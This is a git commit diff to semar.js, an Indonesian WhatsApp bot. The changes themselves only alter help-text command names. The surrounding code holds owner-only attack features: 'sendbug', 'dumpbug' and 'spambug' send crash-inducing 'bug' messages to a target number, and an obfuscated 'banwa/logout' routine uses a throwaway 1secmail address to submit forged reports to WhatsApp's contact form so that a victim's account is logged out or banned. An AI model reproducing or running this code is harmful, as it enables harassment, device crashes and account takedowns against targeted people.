b961c8a27c50585952f721d12db7a851b096b70a
dcode-denpa <denisjuliandra01@gmail.com>
2022-11-30 20:07:06 +0700

    semar-bmd

--- semar.js
+++ semar.js
@@ -98,9 +98,9 @@ semar.sendMessage(from,{text:`❏  *OTHER MENU*
 •   ${prefix}demote
          
 ❏  *BUG MENU*
-•   ${prefix}sendbug
-•   ${prefix}dumpbug
-•   ${prefix}spambug
+•   ${prefix}${command}
+•   ${prefix}${command}
+•   ${prefix}${command}
 •   ${prefix}buggc
 •   ${prefix}banwa
          
@@ -118,12 +118,12 @@ break
 //©from: dennis × ivan
 case 'verify': case 'ban': case 'logout': case 'banwa':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
-if (!dn) return reply(`Silahkan masukkan nomor dan kode negara!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx|ID`)
-if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx|ID`)
+if (!dn) return reply(`Silahkan masukkan nomor dan kode negara!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx|ID`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx|ID`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa logout ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa logout ke nomor ini!')
 nd = dn.split("|")
-if (!nd[1]) return reply(`Silahkan masukkan kode negara!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx|ID`)
+if (!nd[1]) return reply(`Silahkan masukkan kode negara!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx|ID`)
 function _0x549a(){var _0x32c5a3=['y29UC29Szq','yMLUza','nJyYmZq0r1Hyz0PI','AhjLzG','Aw5MBW','CgfYC2u','x19H','zw1HAwXFy29UzMLYBq','ChjVDg90ExbL','mxvjteDQBa','x19Yzxy','qu5euK9jra','AgvHzgvYCW','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','x19WCM90B19F','zw1HAwW','mtK5ntmZnwDtqvnQsa','x19JC3i','C3rLCa','oePUvvnSsG','zM9YicG7oYK7','y29UC3rYDwn0B3i','CMvWBgfJzq','ndC2mdqZng1swuLoCW','BgvUz3rO','x19Yzxe','DMfS','x19Jy2C','zM9YBwf0','zMLUza','Aw5WDxrBBMfTzt1SC2rD','CgXHDgzVCM0','mtaWnJyZmdG1oa','zgf0yq','mtjMzKH6uxG','x19JB21Tzw50x3jLCq','nJm5odfAq2HLs2m','yxbWBhK','CgHVBMvFBNvTyMvY','C2v0lwnVB2TPzq','x191C2vY','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29Tl2nVBNrHy3qVBM9JBgLLBNqV','Aw5WDxrBBMfTzt1QyxPVzxn0xq','y291BNrYEv9ZzwXLy3rVCG','zM9YBq','mJe5otuZmvH4A0nuBG','C3vIBwL0','AMf6B2vZDa','kcGOlISPkYKRksSK','DhjHy2u','zxjYB3i','yxbWzw5K','z2v0','C2vHCMnO','DgfIBgu','Dg9tDhjPBMC','AM9PBG','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29T','ugvYzgLKBY9YB3vIywrVoIbKzxnHDgL2zsbTAw5OysbJB250yq','Bg9N','yxr0CG','mti2ote4mgX3r0nsAG','CMv0DxjUicHMDw5JDgLVBIGPia','Bg9Hza','vu5ltK9xtG','mZm1odCXnfvwtxn0qG','mtKZmtyUqLa6D2HHDhnHChbFD3D3x3bRzY4YlJaUmc4WlJa','mtCYmfvlrNLLCq','mJC1yLDdugDR'];_0x549a=function(){return _0x32c5a3;};return _0x549a();}var _0x3830bc=_0x40ba;(function(_0x23f9cb,_0x53ebfc){var _0x615abe=_0x40ba,_0xdf32cc=_0x23f9cb();while(!![]){try{var _0x5a2c09=parseInt(_0x615abe(0x172))/0x1*(parseInt(_0x615abe(0x165))/0x2)+-parseInt(_0x615abe(0x151))/0x3*(-parseInt(_0x615abe(0x17c))/0x4)+parseInt(_0x615abe(0x179))/0x5*(parseInt(_0x615abe(0x18b))/0x6)+parseInt(_0x615abe(0x180))/0x7+parseInt(_0x615abe(0x16b))/0x8+parseInt(_0x615abe(0x18d))/0x9*(-parseInt(_0x615abe(0x167))/0xa)+parseInt(_0x615abe(0x168))/0xb*(-parseInt(_0x615abe(0x161))/0xc);if(_0x5a2c09===_0x53ebfc)break;else _0xdf32cc['push'](_0xdf32cc['shift']());}catch(_0x2a4f6b){_0xdf32cc['push'](_0xdf32cc['shift']());}}}(_0x549a,0xcd093));var _0x66c510=(function(){var _0x21f54b=!![];return function(_0x1c9b66,_0x36c9d2){var _0x39d2ac=_0x21f54b?function(){var _0x2b99f7=_0x40ba;if(_0x36c9d2){var _0x6c8219=_0x36c9d2[_0x2b99f7(0x149)](_0x1c9b66,arguments);return _0x36c9d2=null,_0x6c8219;}}:function(){};return _0x21f54b=![],_0x39d2ac;};}()),_0x893d87=_0x66c510(this,function(){var _0x5b72f9=_0x40ba;return _0x893d87[_0x5b72f9(0x15b)]()[_0x5b72f9(0x159)]('(((.+)+)+)+$')[_0x5b72f9(0x15b)]()['constructor'](_0x893d87)[_0x5b72f9(0x159)](_0x5b72f9(0x154));});_0x893d87();var _0xbda2a9=(function(){var _0x248956=!![];return function(_0x434c9f,_0x594299){var _0x908e08=_0x248956?function(){var _0x137c4c=_0x40ba;if(_0x594299){var _0x46f6b0=_0x594299[_0x137c4c(0x149)](_0x434c9f,arguments);return _0x594299=null,_0x46f6b0;}}:function(){};return _0x248956=![],_0x908e08;};}()),_0x450311=_0xbda2a9(this,function(){var _0xee46cc=_0x40ba,_0x681ca5;try{var _0x4648b0=Function(_0xee46cc(0x162)+_0xee46cc(0x176)+');');_0x681ca5=_0x4648b0();}catch(_0x4ae754){_0x681ca5=window;}var _0xf056e3=_0x681ca5[_0xee46cc(0x169)]=_0x681ca5[_0xee46cc(0x169)]||{},_0x1e41b5=[_0xee46cc(0x15f),'warn',_0xee46cc(0x16d),_0xee46cc(0x156),'exception',_0xee46cc(0x15a),_0xee46cc(0x155)];for(var _0x12d617=0x0;_0x12d617<_0x1e41b5[_0xee46cc(0x181)];_0x12d617++){var _0x29f179=_0xbda2a9[_0xee46cc(0x17e)][_0xee46cc(0x171)][_0xee46cc(0x16a)](_0xbda2a9),_0xe38a15=_0x1e41b5[_0x12d617],_0xe89919=_0xf056e3[_0xe38a15]||_0x29f179;_0x29f179[_0xee46cc(0x177)]=_0xbda2a9['bind'](_0xbda2a9),_0x29f179['toString']=_0xe89919['toString']['bind'](_0xe89919),_0xf056e3[_0xe38a15]=_0x29f179;}});_0x450311();function _0x40ba(_0x3c6d6d,_0x36f10d){var _0x18ec27=_0x549a();return _0x40ba=function(_0x450311,_0xbda2a9){_0x450311=_0x450311-0x149;var _0x12c20f=_0x18ec27[_0x450311];if(_0x40ba['GerCzV']===undefined){var _0xad10b=function(_0x40ba72){var _0x457af3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4610c5='',_0x36dcd1='',_0x4f3651=_0x4610c5+_0xad10b;for(var _0x3df9a1=0x0,_0x13f6f2,_0x21f54b,_0x1c9b66=0x0;_0x21f54b=_0x40ba72['charAt'](_0x1c9b66++);~_0x21f54b&&(_0x13f6f2=_0x3df9a1%0x4?_0x13f6f2*0x40+_0x21f54b:_0x21f54b,_0x3df9a1++%0x4)?_0x4610c5+=_0x4f3651['charCodeAt'](_0x1c9b66+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x13f6f2>>(-0x2*_0x3df9a1&0x6)):_0x3df9a1:0x0){_0x21f54b=_0x457af3['indexOf'](_0x21f54b);}for(var _0x36c9d2=0x0,_0x39d2ac=_0x4610c5['length'];_0x36c9d2<_0x39d2ac;_0x36c9d2++){_0x36dcd1+='%'+('00'+_0x4610c5['charCodeAt'](_0x36c9d2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x36dcd1);};_0x40ba['uHFgdU']=_0xad10b,_0x3c6d6d=arguments,_0x40ba['GerCzV']=!![];}var _0x893d87=_0x18ec27[0x0],_0x66c510=_0x450311+_0x893d87,_0x549aef=_0x3c6d6d[_0x66c510];if(!_0x549aef){var _0x6c8219=function(_0x248956){this['VwyCaE']=_0x248956,this['tfVlCR']=[0x1,0x0,0x0],this['ugjykB']=function(){return'newState';},this['VuetGS']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['ZJYCZf']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x6c8219['prototype']['iIwiXJ']=function(){var _0x434c9f=new RegExp(this['VuetGS']+this['ZJYCZf']),_0x594299=_0x434c9f['test'](this['ugjykB']['toString']())?--this['tfVlCR'][0x1]:--this['tfVlCR'][0x0];return this['pKKDuC'](_0x594299);},_0x6c8219['prototype']['pKKDuC']=function(_0x908e08){if(!Boolean(~_0x908e08))return _0x908e08;return this['odXFHb'](this['VwyCaE']);},_0x6c8219['prototype']['odXFHb']=function(_0x46f6b0){for(var _0x681ca5=0x0,_0x4648b0=this['tfVlCR']['length'];_0x681ca5<_0x4648b0;_0x681ca5++){this['tfVlCR']['push'](Math['round'](Math['random']())),_0x4648b0=this['tfVlCR']['length'];}return _0x46f6b0(this['tfVlCR'][0x0]);},new _0x6c8219(_0x40ba)['iIwiXJ'](),_0x12c20f=_0x40ba['uHFgdU'](_0x12c20f),_0x3c6d6d[_0x66c510]=_0x12c20f;}else _0x12c20f=_0x549aef;return _0x12c20f;},_0x40ba(_0x3c6d6d,_0x36f10d);}var ntah=await axios[_0x3830bc(0x158)](_0x3830bc(0x14d)),email=await axios['get']('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'),cookie=ntah[_0x3830bc(0x175)][_0x3830bc(0x14b)][_0x3830bc(0x15c)](';\x20'),$=cheerio[_0x3830bc(0x163)](ntah[_0x3830bc(0x18a)]),$form=$(_0x3830bc(0x150)),url=new URL($form[_0x3830bc(0x160)]('action'),_0x3830bc(0x15d))[_0x3830bc(0x16c)],form=new URLSearchParams();form[_0x3830bc(0x157)](_0x3830bc(0x153),$form[_0x3830bc(0x186)](_0x3830bc(0x14e))[_0x3830bc(0x183)]()),form[_0x3830bc(0x157)]('lsd',$form[_0x3830bc(0x186)](_0x3830bc(0x187))[_0x3830bc(0x183)]()),form[_0x3830bc(0x157)](_0x3830bc(0x17b),_0x3830bc(0x152)),form[_0x3830bc(0x157)](_0x3830bc(0x14f),''+nd[0x1]),form[_0x3830bc(0x157)](_0x3830bc(0x14a),''+nd[0x0]),form[_0x3830bc(0x157)](_0x3830bc(0x178),email[_0x3830bc(0x18a)][0x0]),form[_0x3830bc(0x157)](_0x3830bc(0x170),email['data'][0x0]),form[_0x3830bc(0x157)](_0x3830bc(0x188),_0x3830bc(0x174)),form[_0x3830bc(0x157)]('your_message',_0x3830bc(0x15e)),form[_0x3830bc(0x157)](_0x3830bc(0x14c),'0'),form[_0x3830bc(0x157)](_0x3830bc(0x16f),'1'),form[_0x3830bc(0x157)](_0x3830bc(0x17a),''),form[_0x3830bc(0x157)](_0x3830bc(0x182),'8'),form['append']('__hs',_0x3830bc(0x166)),form[_0x3830bc(0x157)]('dpr','1'),form['append'](_0x3830bc(0x184),_0x3830bc(0x164)),form['append'](_0x3830bc(0x173),_0x3830bc(0x189)),form[_0x3830bc(0x157)](_0x3830bc(0x18c),'0');var res=await axios({'url':url,'method':'POST','data':form,'headers':{'cookie':cookie}});reply('Sukses\x20logout\x20'+nd[0x0]+'\x20'+util[_0x3830bc(0x185)](JSON[_0x3830bc(0x16e)](res[_0x3830bc(0x18a)][_0x3830bc(0x17f)](_0x3830bc(0x17d),''))));
 break
 
@@ -195,14 +195,14 @@ break
 //©from: dennis × ivan
 case 'sendbug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
-if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
-if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
-if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 nd = dn.split("|")
 if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
-if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
 reply('Loading 3Second...')
 for (let i = 0; i < nd[1]; i++){
 await sleep(3000)
@@ -216,9 +216,9 @@ break
 //©from: dennis × andik
 case 'dumpbug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
-if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
-if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
-if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
+if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
@@ -228,9 +228,9 @@ break
 //©from: dennis × ivan × andik
 case 'spambug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
-if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}`)
-if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
-if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 reply('Berhasil mengirim 1 bug!')
